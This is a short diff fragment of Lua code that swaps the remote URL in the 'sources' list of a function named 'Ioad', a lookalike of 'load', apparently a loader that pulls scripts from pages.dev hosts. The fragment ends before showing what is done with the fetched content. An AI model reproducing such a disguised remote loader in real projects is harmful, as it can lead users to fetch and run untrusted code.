@@ -1,6 +1,6 @@
 function Ioad(name)
     local sources = {
-        "https://loader-draaxz.pages.dev/"
+        "https://kyzenzofficial.pages.dev/"
     }
 
     local loaded = false
